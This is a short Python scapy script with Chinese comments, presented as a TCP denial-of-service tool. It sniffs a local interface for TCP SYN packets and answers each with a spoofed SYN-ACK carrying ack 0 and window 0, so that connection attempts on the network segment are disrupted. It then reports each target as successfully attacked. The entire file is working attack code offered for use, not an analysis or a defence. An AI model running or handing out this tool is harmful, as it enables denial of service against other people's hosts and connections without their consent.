#coding:utf-8

'''
针对syn的dos，构造不符合条件的ack报文
date:2017-07-15
author:feiniao
Version:1.0
'''

from scapy.all import *
import random

'''
1、windows绑定本机网卡,首先使用show_interfaces()查看相关网卡
2、再使用conf.iface=''绑定相应的网卡
3、linux需要在sniff()中指定相应的网卡

''' 
conf.iface='Intel(R) Dual Band Wireless-AC 8260'

#随机ip字段的id和ttl

ipid = random.randint(1,65535)
ipttl = random.randint(45,80)
tcpseq = random.randint(1,4294967295)

def buying(tcpmots):
	resp = Ether()/IP()/TCP()

	#构造TCP相关字段
	resp[TCP].dport = tcpmots[TCP].sport
	resp[TCP].sport = tcpmots[TCP].dport
	resp[TCP].ack = 0
	resp[TCP].flags = "SA"
	resp[TCP].window = 0

	#构造IP包头
	resp[IP].src = tcpmots[IP].dst
	resp[IP].dst = tcpmots[IP].src
	resp[IP].ttl = ipttl
	resp[IP].id  = ipid

	#构造以太网包头
	resp[Ether].src = tcpmots[Ether].dst
	resp[Ether].dst = tcpmots[Ether].src
	
	#发送构造的TCP DOS 包
	sendp(resp,count=1)
	print("TCP DOS 攻击",resp[IP].dst,"成功")
	
if __name__ == '__main__':
	sniff(prn=buying,filter='tcp[tcpflags]&(tcp-syn)!=0 and tcp[tcpflags]&(tcp-ack)==0')
